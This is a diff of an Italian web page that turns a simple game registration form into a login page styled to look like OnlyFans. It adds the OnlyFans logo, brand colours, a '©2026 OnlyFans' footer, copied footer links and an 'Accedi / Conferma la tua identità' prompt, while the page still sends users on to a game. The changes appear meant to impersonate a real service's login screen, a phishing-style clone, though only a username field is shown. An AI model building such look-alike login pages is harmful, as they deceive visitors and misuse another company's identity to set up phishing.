@@ -3,79 +3,318 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Registrati</title>
+  <title>Accedi</title>
   <style>
-    * { box-sizing: border-box; }
+    * { 
+      box-sizing: border-box; 
+    }
     body {
       margin: 0;
       min-height: 100vh;
       display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
-      background: linear-gradient(160deg, #e6f4ff 0%, #cfe9fb 100%);
-      color: #17344d;
+      flex-direction: column;
+      font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background: #ffffff;
+      color: #202124;
     }
+
+    /* --- STILE BANNER --- */
+    .banner-container {
+      width: 100%;
+      height: 28vh; 
+      min-height: 200px;
+      background-color: #00AFF0; 
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .banner-img {
+      width: 100%;
+      max-width: 550px; 
+      height: auto;
+      padding: 20px;
+      object-fit: contain;
+      mix-blend-mode: lighten; 
+    }
+
+    /* Rimosso flex: 1 per non forzare spazi vuoti e ridotto il padding inferiore */
+    .content-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 48px 24px 20px 24px; 
+      width: 100%;
+    }
+    
     .card {
       width: 100%;
       max-width: 360px;
-      margin: 16px;
-      padding: 28px;
       background: #ffffff;
-      border-radius: 16px;
-      box-shadow: 0 10px 30px rgba(41, 128, 185, .18);
     }
-    h1 { margin: 0 0 4px; font-size: 1.5rem; color: #0f5f99; }
-    p.sub { margin: 0 0 20px; color: #5b7b94; font-size: .9rem; }
-    label { display: block; margin: 14px 0 6px; font-size: .85rem; color: #3d6482; }
-    input {
+    h1.title {
+      font-size: 20px;
+      font-weight: 600;
+      margin: 0 0 6px 0;
+      color: #202124;
+    }
+    p.subtitle {
+      font-size: 15px;
+      color: #5f6368;
+      margin: 0 0 24px 0;
+    }
+    .input-wrapper {
+      position: relative;
+      margin-bottom: 30px;
+      margin-top: 10px;
+    }
+    .input-wrapper input {
       width: 100%;
-      padding: 11px 12px;
-      border: 1px solid #b9d9ee;
-      border-radius: 10px;
-      background: #f5fbff;
-      color: inherit;
-      font-size: 1rem;
+      padding: 14px 16px;
+      border: 1px solid #cbd0d5;
+      border-radius: 6px;
+      font-size: 16px;
+      color: #202124;
+      background-color: transparent;
+      outline: none;
+      transition: border-color 0.2s;
     }
-    input:focus { outline: 2px solid #4fb3ee; border-color: transparent; background: #fff; }
+    .input-wrapper input:focus {
+      border-color: #00A8F3;
+    }
+    .input-wrapper label {
+      position: absolute;
+      top: -8px;
+      left: 12px;
+      background: #ffffff;
+      padding: 0 4px;
+      font-size: 12px;
+      color: #70757a;
+      pointer-events: none;
+    }
+    .input-wrapper input:focus + label {
+      color: #00A8F3;
+    }
     button {
       width: 100%;
-      margin-top: 22px;
-      padding: 12px;
+      padding: 14px;
       border: 0;
-      border-radius: 10px;
-      background: #2f9de0;
-      color: #fff;
-      font-size: 1rem;
-      font-weight: 600;
+      border-radius: 50px;
+      background: #00b0ff;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: bold;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
       cursor: pointer;
-      transition: background .15s;
+      transition: background 0.2s;
     }
-    button:hover { background: #1f8bcc; }
-    button:disabled { opacity: .6; cursor: wait; }
-    #msg { min-height: 1.3em; margin-top: 14px; font-size: .9rem; }
-    .err { color: #d64545; }
-    .ok { color: #1d9a63; }
-    small { display: block; margin-top: 16px; color: #7f9db3; font-size: .75rem; }
+    button:hover { 
+      background: #009ce0; 
+    }
+    button:disabled { 
+      opacity: 0.6; cursor: wait; 
+    }
+    #msg { 
+      min-height: 1.3em; 
+      margin-top: 14px; 
+      font-size: 14px; 
+      text-align: center; 
+    }
+    .err { color: #d93025; }
+    .ok { color: #188038; }
+
+    /* Ridotto il margin-top dell'attribuzione per compattare ulteriormente lo spazio */
+    .attribution {
+      margin-top: 24px;
+      font-size: 11px;
+      color: #70757a;
+      text-align: center;
+    }
+    .attribution a {
+      color: #00b0ff;
+      text-decoration: none;
+    }
+
+    /* --- STILI FOOTER --- */
+    .site-footer {
+      width: 100%;
+      background: #ffffff;
+      /* Ridotto il padding superiore del footer */
+      padding: 40px 40px 60px 40px; 
+    }
+    .footer-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: 1fr 1fr 1.3fr 1fr 1.5fr; 
+      gap: 20px;
+      color: #8BA0B2;
+      font-size: 14px;
+    }
+    .footer-col {
+      display: flex;
+      flex-direction: column;
+      gap: 22px; 
+      align-items: flex-start;
+    }
+    .footer-col a, .footer-col span {
+      color: #8BA0B2;
+      text-decoration: none;
+      line-height: 1.4;
+      transition: color 0.2s;
+    }
+    .footer-col a:hover {
+      color: #5c6c7b;
+    }
+    .social-links {
+      display: flex;
+      gap: 24px;
+      align-items: center;
+    }
+    .social-links svg {
+      width: 18px;
+      height: 18px;
+      fill: currentColor;
+      cursor: pointer;
+    }
+    .social-links svg:hover {
+      color: #5c6c7b;
+    }
+    .separator-line {
+      width: 85px;
+      height: 2px;
+      background-color: #00AFF0; 
+      margin-top: 4px;
+      margin-bottom: 4px;
+    }
+    .lang-selector {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: pointer;
+    }
+    .lang-selector svg {
+      width: 18px;
+      height: 18px;
+      fill: currentColor;
+    }
+
+    /* Adattamento su mobile */
+    @media (max-width: 900px) {
+      .footer-inner {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 40px 20px;
+      }
+    }
+    @media (max-width: 600px) {
+      .footer-inner {
+        grid-template-columns: 1fr;
+      }
+      .site-footer {
+        padding: 40px 24px;
+      }
+    }
   </style>
 </head>
 <body>
-  <main class="card">
-    <h1>Entra nel gioco</h1>
-    <p class="sub">Scegli il tuo username per registrarti.</p>
 
-    <form id="form" autocomplete="off">
-      <label for="username">Username</label>
-      <input id="username" name="username" type="text" required minlength="3" maxlength="20"
-             pattern="[A-Za-z0-9_]{3,20}" autocomplete="off"
-             title="3-20 caratteri: lettere, numeri o underscore">
+  <!-- Banner con Sfondo Blu -->
+  <div class="banner-container">
+    <img src="https://wallpapers.com/images/hd/blue-onlyfans-logo-rdbbplcswqw7vsrm.jpg" 
+         onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/4/4f/OnlyFans_logo.svg';" 
+         alt="Sfondo" class="banner-img">
+  </div>
 
-      <button id="btn" type="submit">Registrati</button>
-      <div id="msg" role="status"></div>
-    </form>
+  <div class="content-wrapper">
+    <main class="card">
+      <h1 class="title">Accedi</h1>
+      <p class="subtitle">Conferma la tua identità</p>
 
-    <small>Da 3 a 20 caratteri: lettere, numeri o underscore.</small>
-  </main>
+      <form id="form" autocomplete="off">
+        <div class="input-wrapper">
+          <input id="username" name="username" type="text" required minlength="3" maxlength="20"
+                 pattern="[A-Za-z0-9_]{3,20}" autocomplete="off" 
+                 placeholder="Scrivi qui il tuo username"
+                 title="3-20 caratteri: lettere, numeri o underscore">
+          <label for="username">Username</label>
+        </div>
+
+        <button id="btn" type="submit">Avanti</button>
+        <div id="msg" role="status"></div>
+      </form>
+      
+      <div class="attribution">
+        <a href="https://wallpapers.com/wallpapers/blue-onlyfans-logo-rdbbplcswqw7vsrm.html" target="_blank"></a>
+      </div>
+    </main>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <!-- Colonna 1 -->
+      <div class="footer-col">
+        <span>©2026 OnlyFans</span>
+        <a href="#">Contatti</a>
+        
+        <div class="social-links">
+          <!-- Icona X -->
+          <svg viewBox="0 0 24 24">
+            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+          </svg>
+          <!-- Icona Instagram -->
+          <svg viewBox="0 0 24 24">
+            <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/>
+          </svg>
+        </div>
+
+        <div class="separator-line"></div>
+
+        <div class="lang-selector">
+          <!-- Icona Mappamondo -->
+          <svg viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+          </svg>
+          <span>Italian</span>
+          <!-- Icona Freccia Giù -->
+          <svg viewBox="0 0 24 24" style="width:14px; height:14px;">
+            <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/>
+          </svg>
+        </div>
+      </div>
+
+      <!-- Colonna 2 -->
+      <div class="footer-col">
+        <a href="#">Help</a>
+        <a href="#">Store</a>
+        <a href="#">Cookie Notice</a>
+        <a href="#">OnlyFans Safety & Transparency<br>Center</a>
+      </div>
+
+      <!-- Colonna 3 -->
+      <div class="footer-col">
+        <a href="#">About</a>
+        <a href="#">Terms of Service</a>
+        <a href="#">DMCA</a>
+        <a href="#">Anti-Slavery and Anti-Trafficking<br>Statement</a>
+      </div>
+
+      <!-- Colonna 4 -->
+      <div class="footer-col">
+        <a href="#">Blog</a>
+        <a href="#">Privacy</a>
+        <a href="#">USC 2257</a>
+        <a href="#">Acceptable Use Policy</a>
+      </div>
+
+      <!-- Colonna 5 -->
+      <div class="footer-col">
+        <a href="#">Branding</a>
+        <a href="#">Complaints Policy</a>
+        <a href="#">Contract between Fan and Creator</a>
+      </div>
+    </div>
+  </footer>
 
   <script>
     const form = document.getElementById('form');
@@ -103,7 +342,7 @@
           return;
         }
 
-        msg.textContent = 'Registrazione completata! Ti porto al gioco...';
+        msg.textContent = 'Autenticazione completata! Ti porto al gioco...';
         msg.className = 'ok';
         setTimeout(() => { window.location.href = data.redirect; }, 1000);
       } catch (err) {
